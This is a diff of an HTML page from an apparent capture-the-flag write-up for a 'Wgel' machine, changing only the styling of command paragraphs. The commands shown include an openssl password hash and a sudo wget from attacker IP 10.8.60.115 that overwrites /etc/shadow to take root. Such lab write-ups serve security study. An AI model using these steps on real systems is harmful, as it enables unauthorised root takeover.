@@ -100,7 +100,7 @@
 					 <figure><img  src="/machines/images/wgelctfimages/4.png"/></figure>&nbsp;
 					 <h6>If we do not set the required permission on the "id_rsa" key, we will get the following error.</h6>&nbsp;
 					 <figure><img  src="/machines/images/wgelctfimages/5.png"/></figure>&nbsp;
-					 <p class="code">chmod 400 id_rsa</p>&nbsp;
+					 <p>chmod 400 id_rsa</p>&nbsp;
 					 <h6>With this Command it will allow the id_rsa file to be read only by the owner of the file.</h6>&nbsp;
 					 <figure><img  src="/machines/images/wgelctfimages/6.png"/></figure>&nbsp;
 					 
@@ -113,11 +113,11 @@
 					 <h6>We can send the /etc/shadow file to our local machine, change the root password and send it back to jessie@ip.</h6>&nbsp;
 					 <figure><img  src="/machines/images/wgelctfimages/9.png"/></figure>&nbsp;
 					 <figure><img  src="/machines/images/wgelctfimages/10.png"/></figure>&nbsp;
-					 <p class="code">sudo openssl passwd -6 -salt ‘hackedpasswd’ ‘password’ </p>&nbsp;
+					 <p>sudo openssl passwd -6 -salt ‘hackedpasswd’ ‘password’ </p>&nbsp;
 					 <h6>command is used to generate a salted SHA-512 hashed password using OpenSSL</h6>&nbsp;
 					 <figure><img  src="/machines/images/wgelctfimages/11.png"/></figure>&nbsp;
-					 <p class="code">python3 -m http.server 8000</p>&nbsp;
-					 <p class="code">sudo /usr/bin/wget http://10.8.60.115:8000/shadow.txt -O /etc/shadow</p>&nbsp;
+					 <p>python3 -m http.server 8000</p>&nbsp;
+					 <p>sudo /usr/bin/wget http://10.8.60.115:8000/shadow.txt -O /etc/shadow</p>&nbsp;
 					 
 					 <h6>command use the wget utility to download shadow.txt our http server  and save it as /etc/shadow on your local system.</h6>&nbsp;
 					 
